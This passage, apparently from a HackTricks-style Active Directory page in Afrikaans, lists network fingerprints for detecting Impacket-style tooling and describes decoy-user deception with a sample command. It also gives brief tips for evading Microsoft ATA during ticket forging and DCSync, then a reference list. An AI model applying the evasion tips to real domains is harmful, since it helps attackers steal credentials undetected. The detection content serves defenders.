- **Hoë-vertroue selfstandige kandidate** (nadat dit teen jou eie baseline gevalideer is):
- Geauthentiseerde DCE/RPC met `auth_context_id = 79231 + ctx_id`
- DCE/RPC-authentication padding gevul met `0xff`
- LDAP Kerberos binds wat ’n rou Kerberos `AP-REQ` direk in SPNEGO se `mechToken` plaas
- SMB2/3-negotiate requests met ASCII-agtige `ClientGuid`-waardes
- WMI `IWbemLevel1Login::NTLMLogin` wat die nie-standaard namespace `//./root/cimv2` gebruik
- Hardcoded Kerberos nonce-waardes
- **Beter as korrelasie-/scoring-features**:
- Yl of duplikaat Kerberos-etype-lyste, ongewone/ontbrekende `PA-DATA`, of TGS-REQ-etype-volgorde wat van native Windows verskil
- NTLM Type 1-boodskappe wat version info ontbreek, of Type 3-boodskappe met null host names
- Rou NTLMSSP wat in DCE/RPC gedra word in plaas van SPNEGO, ontbrekende DCE/RPC-verifikasie-trailers, of SPNEGO/Kerberos-OID-mismatches
- Verskeie van hierdie eienskappe vanaf dieselfde host/user/session/time window is baie sterker as enige enkele swak field
- **Gebruik as enrichment, nie as selfstandige alerts nie**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names en tool-specific HTTP/WebDAV/RDP/MSSQL-strings
- Dit is maklik vir operators om te verander en word die beste gebruik om te verduidelik waarom ’n cross-protocol-cluster verdag is
- **Operational notes**:
- Sommige van hierdie signals vereis decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW of service-side visibility
- Valideer teen Samba/Linux-clients, appliances en legacy software voordat dit na alerts bevorder word
- Bevorder detections van enrichment -> hunting -> alerting soos jy vertroue in die baseline opbou

### **Implementing Deception Techniques**

- Die implementering van deception behels die opstel van traps, soos decoy users of computers, met features soos passwords wat nie expire nie of as Trusted for Delegation gemerk is. ’n Gedetailleerde benadering sluit in om users met spesifieke regte te skep of hulle by high privilege groups te voeg.<sup>[[2]](#references)</sup>
- ’n Praktiese voorbeeld behels die gebruik van tools soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die deployment van deception techniques is beskikbaar by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Vir User Objects**: Verdagte indicators sluit atypical ObjectSID, infrequent logons, creation dates en lae bad password counts in.
- **Algemene Indicators**: Deur attributes van potensiële decoy objects met dié van genuine objects te vergelyk, kan inkonsekwenthede blootgelê word. Tools soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke deceptions te identifiseer.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy session enumeration op Domain Controllers om ATA-detection te voorkom.
- **Ticket Impersonation**: Deur **aes**-keys vir ticket creation te gebruik, help dit om detection te ontduik deur nie na NTLM te downgrade nie.
- **DCSync Attacks**: Dit word aanbeveel om dit vanaf ’n nie-Domain Controller uit te voer om ATA-detection te vermy, aangesien direkte uitvoering vanaf ’n Domain Controller alerts sal trigger.

## References

- [1] [’n Gids tot die aanval van Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Van Domain Admin tot Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Van DA tot EA met ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
